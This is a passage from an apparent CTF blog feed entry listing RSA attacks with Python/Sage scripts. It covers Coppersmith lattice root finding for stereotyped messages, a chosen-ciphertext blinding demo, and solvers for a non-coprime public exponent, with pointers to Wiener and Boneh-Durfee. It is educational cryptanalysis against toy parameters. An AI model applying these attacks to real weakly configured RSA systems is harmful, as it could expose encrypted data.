cond1        cond2 <span class="token operator">=</span> pow<span class="token punctuation">(</span>modulus<span class="token punctuation">,</span> beta<span class="token operator">*</span>mm<span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">"* N^(beta*m) = "</span><span class="token punctuation">,</span> cond2        <span class="token keyword">print</span> <span class="token string">"* X^(n-1) &lt; N^(beta*m) \n-> GOOD"</span> <span class="token keyword">if</span> cond1 <span class="token operator">&lt;</span> cond2 <span class="token keyword">else</span> <span class="token string">"* X^(n-1) >= N^(beta*m) \n-> NOT GOOD"</span>        <span class="token comment" spellcheck="true"># bound for X</span>        <span class="token keyword">print</span> <span class="token string">"\n# X bound respected?\n"</span>        <span class="token keyword">print</span> <span class="token string">"we want X &lt;= N^(((2*beta*m)/(n-1)) - ((delta*m*(m+1))/(n*(n-1)))) / 2 = M"</span>        <span class="token keyword">print</span> <span class="token string">"* X ="</span><span class="token punctuation">,</span> XX        cond2 <span class="token operator">=</span> RR<span class="token punctuation">(</span>modulus<span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>beta<span class="token operator">*</span>mm<span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span>nn<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>dd<span class="token operator">*</span>mm<span class="token operator">*</span><span class="token punctuation">(</span>mm<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span>nn<span class="token operator">*</span><span class="token punctuation">(</span>nn<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">"* M ="</span><span class="token punctuation">,</span> cond2        <span class="token keyword">print</span> <span class="token string">"* X &lt;= M \n-> GOOD"</span> <span class="token keyword">if</span> XX <span class="token operator">&lt;=</span> cond2 <span class="token keyword">else</span> <span class="token string">"* X > M \n-> NOT GOOD"</span>        <span class="token comment" spellcheck="true"># solution possible?</span>        <span class="token keyword">print</span> <span class="token string">"\n# Solutions possible?\n"</span>        detL <span class="token operator">=</span> RR<span class="token punctuation">(</span>modulus<span class="token operator">^</span><span class="token punctuation">(</span>dd <span class="token operator">*</span> mm <span class="token operator">*</span> <span class="token punctuation">(</span>mm <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">*</span> XX<span class="token operator">^</span><span class="token punctuation">(</span>nn <span class="token operator">*</span> <span class="token punctuation">(</span>nn <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">"we can find a solution if 2^((n - 1)/4) * det(L)^(1/n) &lt; N^(beta*m) / sqrt(n)"</span>        cond1 <span class="token operator">=</span> RR<span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span>nn <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">*</span> detL<span class="token operator">^</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">/</span>nn<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">"* 2^((n - 1)/4) * det(L)^(1/n) = "</span><span class="token punctuation">,</span> cond1        cond2 <span class="token operator">=</span> RR<span class="token punctuation">(</span>modulus<span class="token operator">^</span><span class="token punctuation">(</span>beta<span class="token operator">*</span>mm<span class="token punctuation">)</span> <span class="token operator">/</span> sqrt<span class="token punctuation">(</span>nn<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">"* N^(beta*m) / sqrt(n) = "</span><span class="token punctuation">,</span> cond2        <span class="token keyword">print</span> <span class="token string">"* 2^((n - 1)/4) * det(L)^(1/n) &lt; N^(beta*m) / sqrt(n) \n-> SOLUTION WILL BE FOUND"</span> <span class="token keyword">if</span> cond1 <span class="token operator">&lt;</span> cond2 <span class="token keyword">else</span> <span class="token string">"* 2^((n - 1)/4) * det(L)^(1/n) >= N^(beta*m) / sqroot(n) \n-> NO SOLUTIONS MIGHT BE FOUND (but we never know)"</span>        <span class="token comment" spellcheck="true"># warning about X</span>        <span class="token keyword">print</span> <span class="token string">"\n# Note that no solutions will be found _for sure_ if you don't respect:\n* |root| &lt; X \n* b >= modulus^beta\n"</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># Coppersmith revisited algo for univariate</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># change ring of pol and x</span>    polZ <span class="token operator">=</span> pol<span class="token punctuation">.</span>change_ring<span class="token punctuation">(</span>ZZ<span class="token punctuation">)</span>    x <span class="token operator">=</span> polZ<span class="token punctuation">.</span>parent<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>gen<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># compute polynomials</span>    gg <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> ii <span class="token keyword">in</span> range<span class="token punctuation">(</span>mm<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> jj <span class="token keyword">in</span> range<span class="token punctuation">(</span>dd<span class="token punctuation">)</span><span class="token punctuation">:</span>            gg<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">*</span> XX<span class="token punctuation">)</span><span class="token operator">**</span>jj <span class="token operator">*</span> modulus<span class="token operator">**</span><span class="token punctuation">(</span>mm <span class="token operator">-</span> ii<span class="token punctuation">)</span> <span class="token operator">*</span> polZ<span class="token punctuation">(</span>x <span class="token operator">*</span> XX<span class="token punctuation">)</span><span class="token operator">**</span>ii<span class="token punctuation">)</span>    <span class="token keyword">for</span> ii <span class="token keyword">in</span> range<span class="token punctuation">(</span>tt<span class="token punctuation">)</span><span class="token punctuation">:</span>        gg<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">*</span> XX<span class="token punctuation">)</span><span class="token operator">**</span>ii <span class="token operator">*</span> polZ<span class="token punctuation">(</span>x <span class="token operator">*</span> XX<span class="token punctuation">)</span><span class="token operator">**</span>mm<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># construct lattice B</span>    BB <span class="token operator">=</span> Matrix<span class="token punctuation">(</span>ZZ<span class="token punctuation">,</span> nn<span class="token punctuation">)</span>    <span class="token keyword">for</span> ii <span class="token keyword">in</span> range<span class="token punctuation">(</span>nn<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> jj <span class="token keyword">in</span> range<span class="token punctuation">(</span>ii<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span> jj<span class="token punctuation">]</span> <span class="token operator">=</span> gg<span class="token punctuation">[</span>ii<span class="token punctuation">]</span><span class="token punctuation">[</span>jj<span class="token punctuation">]</span>    <span class="token comment" spellcheck="true"># display basis matrix</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        matrix_overview<span class="token punctuation">(</span>BB<span class="token punctuation">,</span> modulus<span class="token operator">^</span>mm<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># LLL</span>    BB <span class="token operator">=</span> BB<span class="token punctuation">.</span>LLL<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># transform shortest vector in polynomial</span>    new_pol <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> ii <span class="token keyword">in</span> range<span class="token punctuation">(</span>nn<span class="token punctuation">)</span><span class="token punctuation">:</span>        new_pol <span class="token operator">+=</span> x<span class="token operator">**</span>ii <span class="token operator">*</span> BB<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> ii<span class="token punctuation">]</span> <span class="token operator">/</span> XX<span class="token operator">**</span>ii    <span class="token comment" spellcheck="true"># factor polynomial</span>    potential_roots <span class="token operator">=</span> new_pol<span class="token punctuation">.</span>roots<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"potential roots:"</span><span class="token punctuation">,</span> potential_roots    <span class="token comment" spellcheck="true"># test roots</span>    roots <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> root <span class="token keyword">in</span> potential_roots<span class="token punctuation">:</span>        <span class="token keyword">if</span> root<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>is_integer<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            result <span class="token operator">=</span> polZ<span class="token punctuation">(</span>ZZ<span class="token punctuation">(</span>root<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> gcd<span class="token punctuation">(</span>modulus<span class="token punctuation">,</span> result<span class="token punctuation">)</span> <span class="token operator">>=</span> modulus<span class="token operator">^</span>beta<span class="token punctuation">:</span>                roots<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ZZ<span class="token punctuation">(</span>root<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token keyword">return</span> roots<span class="token comment" spellcheck="true">############################################</span><span class="token comment" spellcheck="true"># Test on Stereotyped Messages</span><span class="token comment" spellcheck="true">##########################################</span><span class="token keyword">print</span> <span class="token string">"//////////////////////////////////"</span><span class="token keyword">print</span> <span class="token string">"// TEST 1"</span><span class="token keyword">print</span> <span class="token string">"////////////////////////////////"</span><span class="token comment" spellcheck="true"># RSA gen options (for the demo)</span>length_N <span class="token operator">=</span> <span class="token number">1024</span>  <span class="token comment" spellcheck="true"># size of the modulus</span>Kbits <span class="token operator">=</span> <span class="token number">512</span>      <span class="token comment" spellcheck="true"># size of the root</span>e <span class="token operator">=</span> <span class="token number">3</span><span class="token comment" spellcheck="true"># RSA gen (for the demo)</span>N<span class="token operator">=</span><span class="token number">0x79982a272b9f50b2c2bc8b862ccc617bb39720a6dc1a22dc909bbfd1243cc0a03dd406ec0b1a78fa75ce5234e8c57e0aab492050906364353b06ccd45f90b7818b04be4734eeb8e859ef92a306be105d32108a3165f96664ac1e00bba770f04627da05c3d7513f5882b2807746090cebbf74cd50c0128559a2cc9fa7d88f7b2d</span>ZmodN <span class="token operator">=</span> Zmod<span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true"># Create problem (for the demo)</span>K <span class="token operator">=</span> ZZ<span class="token punctuation">.</span>random_element<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token operator">^</span>Kbits<span class="token punctuation">)</span>Kdigits <span class="token operator">=</span> K<span class="token punctuation">.</span>digits<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>M <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span>Kbits <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token punctuation">(</span>length_N<span class="token operator">-</span>Kbits<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>Kdigits<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    M<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> Kdigits<span class="token punctuation">[</span>i<span class="token punctuation">]</span>M <span class="token operator">=</span> ZZ<span class="token punctuation">(</span>M<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>C<span class="token operator">=</span><span class="token number">0x381db081852c92d268b49a1b9486d724e4ecf49fc97dc5f20d1fad902b5cdfb49c8cc1e968e36f65ae9af7e8186f15ccdca798786669a3d2c9fe8767a7ae938a4f9115ae8fed4928d95ad550fddd3a9c1497785c9e2279edf43f04601980aa28b3b52afb55e2b34e5b175af25d5b3bd71db88b3b31e48a177a469116d957592c</span>b<span class="token operator">=</span><span class="token number">0xfedcba98765432100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><span class="token comment" spellcheck="true"># Problem to equation (default)</span>P<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>ZmodN<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#, implementation='NTL')</span>pol <span class="token operator">=</span> <span class="token punctuation">(</span>b <span class="token operator">+</span> x<span class="token punctuation">)</span><span class="token operator">^</span>e <span class="token operator">-</span> Cdd <span class="token operator">=</span> pol<span class="token punctuation">.</span>degree<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># Tweak those</span>beta <span class="token operator">=</span> <span class="token number">1</span>                                <span class="token comment" spellcheck="true"># b = N</span>epsilon <span class="token operator">=</span> beta <span class="token operator">/</span> <span class="token number">7</span>                      <span class="token comment" spellcheck="true"># &lt;= beta / 7</span>mm <span class="token operator">=</span> ceil<span class="token punctuation">(</span>beta<span class="token operator">**</span><span class="token number">2</span> <span class="token operator">/</span> <span class="token punctuation">(</span>dd <span class="token operator">*</span> epsilon<span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># optimized value</span>tt <span class="token operator">=</span> floor<span class="token punctuation">(</span>dd <span class="token operator">*</span> mm <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">/</span>beta<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># optimized value</span>XX <span class="token operator">=</span> ceil<span class="token punctuation">(</span>N<span class="token operator">**</span><span class="token punctuation">(</span><span class="token punctuation">(</span>beta<span class="token operator">**</span><span class="token number">2</span><span class="token operator">/</span>dd<span class="token punctuation">)</span> <span class="token operator">-</span> epsilon<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># optimized value</span><span class="token comment" spellcheck="true"># Coppersmith</span>start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>roots <span class="token operator">=</span> coppersmith_howgrave_univariate<span class="token punctuation">(</span>pol<span class="token punctuation">,</span> N<span class="token punctuation">,</span> beta<span class="token punctuation">,</span> mm<span class="token punctuation">,</span> tt<span class="token punctuation">,</span> XX<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># output</span><span class="token keyword">print</span> <span class="token string">"\n# Solutions"</span><span class="token keyword">print</span> <span class="token string">"we want to find:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>K<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"we found:"</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>roots<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"in: %s seconds "</span> <span class="token operator">%</span> <span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start_time<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"\n"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="12-wiener-attack"><a href="#12-wiener-attack" class="headerlink" title="12.wiener attack"></a>12.wiener attack</h1><p>if e looks very big.the d may very small.<br>wiener is best to deal it.<br><a href="https://github.com/pablocelayes/rsa-wiener-attack">wiener attack</a></p><h1 id="13-Boneh-Durfee-Method"><a href="#13-Boneh-Durfee-Method" class="headerlink" title="13.Boneh Durfee Method"></a>13.Boneh Durfee Method</h1><p>if $ d \leq { N ^ 0.292 } $<br>waiting …..</p><h1 id="14-choose-cipher-attack"><a href="#14-choose-cipher-attack" class="headerlink" title="14.choose cipher attack"></a>14.choose cipher attack</h1><p>alice : m,n,e,c<br>bob : p,q,d,e</p><p>alice give c to bob<br>but we attack it.<br>we choose a and a need gcd(a,n)==1.<br>computer y=(c * pow(a,e,n))%n</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> gmpy2e<span class="token operator">=</span><span class="token number">3</span>d<span class="token operator">=</span><span class="token number">76049878755826336166698139456670360823402717889604969895349508344800412770121957624523975279069318035733764051730593939133424845912466592703373981870874751299015095128705553078747239081130209768910810258649166320353848933996042110730355149970574587323408350943779715053374237240149786382572122316303550059037311599492982439109580656235437909296003096272288705370676044110102935615857801394460044326948435774452489727128000706767789005786209476060332099626876494991496861201654482133245707868426039793944745637143823027996364278711920669753886683794052292533067458821708034433961163807255826762446204313797046780518947</span>N<span class="token operator">=</span><span class="token number">114074818133739504250047209185005541235104076834407454843024262517200619155182936436785962918603977053600646077595890908700137268868699889055060972806312126948522642693058329618120858621695314653366215387973749480530773400994063166095532724955861880985112526415669572580061355860224679573858183474455325088556643994673345465994162610420723170253345262031304174343327749668957998269532265104735742501097132399909676529715137398930849255495327761212026819673358330120772259339210848101393790624794141497382162858696771273350710124735773784422786465775396114824753700050260926501450377050949467981761553058188615697572753</span>r<span class="token operator">=</span><span class="token number">234523452</span>M<span class="token operator">=</span>int<span class="token punctuation">(</span><span class="token string">'flag&amp;#123;test_for_cca&amp;#125;'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>cipher<span class="token operator">=</span>pow<span class="token punctuation">(</span>M<span class="token punctuation">,</span>e<span class="token punctuation">,</span>N<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">'Initial cipher:\t'</span><span class="token punctuation">,</span>ciphercipher_dash <span class="token operator">=</span> <span class="token punctuation">(</span>cipher <span class="token operator">*</span> pow<span class="token punctuation">(</span>r<span class="token punctuation">,</span>e<span class="token punctuation">,</span>N<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> N<span class="token keyword">print</span> <span class="token string">'Eve gets Bob to decipher:\t'</span><span class="token punctuation">,</span>cipher_dash<span class="token comment" spellcheck="true"># cipher_dash=90511031607784830273878497072346123546679455256898204196402641372333492940234358009499271727755472553207867386254653658733724900948880219984215792979665435989733167788337042506336114726850208031943574244260983595450232099102339183752672009132355515013239721171582732831124336428650165790015071038470233163029309771817779975903409021754911379543318740006147263912863780000070643964489448504069333128038084002549074569589992574916389850594000510506164205174491002424884037866223779862414707858447048555823073520047145522373211382098608293593800755101294502576108329124664271831858488981525137002348725042733161552081766</span>decipher <span class="token operator">=</span> pow<span class="token punctuation">(</span>cipher_dash<span class="token punctuation">,</span>d<span class="token punctuation">,</span>N<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">'Bob says that the result is wrong:'</span><span class="token punctuation">,</span>decipher<span class="token keyword">print</span> <span class="token string">'Eve determines as:'</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>decipher<span class="token operator">/</span>r<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="15-e-is-not-prime-number"><a href="#15-e-is-not-prime-number" class="headerlink" title="15.e is not prime number"></a>15.e is not prime number</h1><p>if e is not prime number.use next two scripts.</p><p>solve1.py</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#-*- coding:utf-8 -*-</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> sympy<span class="token keyword">def</span> <span class="token function">gcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">if</span> a <span class="token operator">&lt;</span> b<span class="token punctuation">:</span>    a<span class="token punctuation">,</span>b <span class="token operator">=</span> b<span class="token punctuation">,</span>a <span class="token keyword">while</span> b <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>     tem <span class="token operator">=</span> a <span class="token operator">%</span> b     a <span class="token operator">=</span> b     b <span class="token operator">=</span> tem <span class="token keyword">return</span> a<span class="token keyword">def</span> <span class="token function">invalidExponent</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span>q<span class="token punctuation">,</span>e<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span> phiN <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> n <span class="token operator">=</span> p <span class="token operator">*</span> q GCD <span class="token operator">=</span> gcd<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phiN<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>GCD <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"Public exponent is valid....."</span> d <span class="token operator">=</span> inverse<span class="token punctuation">(</span>e<span class="token operator">//</span>GCD<span class="token punctuation">,</span>phiN<span class="token punctuation">)</span> c <span class="token operator">=</span> pow<span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span> plaintext <span class="token operator">=</span> sympy<span class="token punctuation">.</span>root<span class="token punctuation">(</span>c<span class="token punctuation">,</span> GCD<span class="token punctuation">)</span> plaintext <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>plaintext<span class="token punctuation">)</span> <span class="token keyword">return</span> plaintext<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> p <span class="token operator">=</span><span class="token number">111052706592359766492182549474994387389169491981939276489132990221393430874991652628482505832745103981784837665110819809096264457329836670397000634684595709283710756727662219358743235400779394350023790569023369287367240988429777113514012101219956479046699448481988253039282406274512111898037689623723478951613</span> q <span class="token operator">=</span><span class="token number">146182161315365079136034892629243958871460254472263352847680359868694597466935352294806409849433942550149005978761759458977642785950171998444382137410141550212657953776734166481126376675282041461924529145282451064083351825934453414726557476469773468589060088164379979035597652907191236468744400214917268039573</span> e <span class="token operator">=</span> <span class="token number">200</span> c <span class="token operator">=</span><span class="token number">7797067792814175554801975939092864905908878472965854967525218347636721153564161093453344819975650594936628697646242713415817737235328825333281389820202851500260665233910426103904874575463134970160306453553794787674331367563821223358610113031883172742577264334021835304931484604571485957116313097395143177603380107508691261081725629713443494783479897404175199621026515502716868988672289887933681890547568860707175288422275073767747544353536862473367590288531216644146154729962448906402712219657000812226637887827912541098992158458173920228864293993030475885461755767069329678218760943185942331149777258713727459739405</span> plaintext <span class="token operator">=</span> invalidExponent<span class="token punctuation">(</span>p<span class="token punctuation">,</span>q<span class="token punctuation">,</span>e<span class="token punctuation">,</span>c<span class="token punctuation">)</span> <span class="token keyword">print</span> plaintextmain<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>solve2.py</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> gmpy2p <span class="token operator">=</span><span class="token number">111052706592359766492182549474994387389169491981939276489132990221393430874991652628482505832745103981784837665110819809096264457329836670397000634684595709283710756727662219358743235400779394350023790569023369287367240988429777113514012101219956479046699448481988253039282406274512111898037689623723478951613</span>q <span class="token operator">=</span><span class="token number">146182161315365079136034892629243958871460254472263352847680359868694597466935352294806409849433942550149005978761759458977642785950171998444382137410141550212657953776734166481126376675282041461924529145282451064083351825934453414726557476469773468589060088164379979035597652907191236468744400214917268039573</span>e <span class="token operator">=</span> <span class="token number">200</span>c <span class="token operator">=</span><span class="token number">7797067792814175554801975939092864905908878472965854967525218347636721153564161093453344819975650594936628697646242713415817737235328825333281389820202851500260665233910426103904874575463134970160306453553794787674331367563821223358610113031883172742577264334021835304931484604571485957116313097395143177603380107508691261081725629713443494783479897404175199621026515502716868988672289887933681890547568860707175288422275073767747544353536862473367590288531216644146154729962448906402712219657000812226637887827912541098992158458173920228864293993030475885461755767069329678218760943185942331149777258713727459739405</span><span class="token comment" spellcheck="true"># e=pow(2,3)*25</span>e1<span class="token operator">=</span><span class="token number">25</span>n<span class="token operator">=</span>p<span class="token operator">*</span>qd <span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e1<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>flag8 <span class="token operator">=</span> pow<span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>flag8<span class="token punctuation">,</span><span class="token punctuation">(</span>e<span class="token operator">/</span>e1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="over"><a href="#over" class="headerlink" title="over"></a>over</h1><p>if something new,I’ll add it</p><p>tips:install gmpy2 in linux</p><pre class="line-numbers language-bash"><code class="language-bash">conda <span class="token function">install</span> gmpy2 -n <span class="token operator">&lt;</span>your <span class="token function">env</span> <span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rsa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rsa_of_ctf_1</title>
      <link href="/2018/06/01/rsa-of-ctf-1/"/>
      <url>/2018/06/01/rsa-of-ctf-1/</url>
      
